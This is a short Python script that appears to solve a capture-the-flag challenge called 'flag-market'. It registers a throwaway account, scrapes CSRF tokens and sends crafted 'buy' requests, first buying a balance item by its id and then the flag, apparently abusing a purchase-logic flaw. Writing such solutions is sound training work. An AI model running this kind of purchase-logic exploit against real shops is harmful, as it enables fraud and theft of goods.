from bs4 import BeautifulSoup

import random
import requests
import string

url = 'https://flag-market.yactf.ru/'

slug = '765f57f3-50d9-4183-bce2-b89679e535f8'
flag_id = 3
balance_id = 13756

def csrf_parser(response):
    soup = BeautifulSoup(response, 'html.parser')
    input = soup.input
    csrf = input['value']
    return csrf

session = requests.Session()

response = session.get(url + 'register')
csrf = csrf_parser(response.text)

username = password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
response = session.post(url + 'register', data = {'_csrf': csrf, 'username': username, 'password': password})
response = session.post(url + 'login', data = {'_csrf': csrf, 'username': username, 'password': password, 'Submit': 'Login'})

response = session.get(url + 'flag/' + slug)
csrf = csrf_parser(response.text)

response = session.post(url + 'buy', data = {'_csrf': csrf, 'flag_id': balance_id})
response = session.post(url + 'buy', data = {'_csrf': csrf, 'flag_id': flag_id})

print(response.text)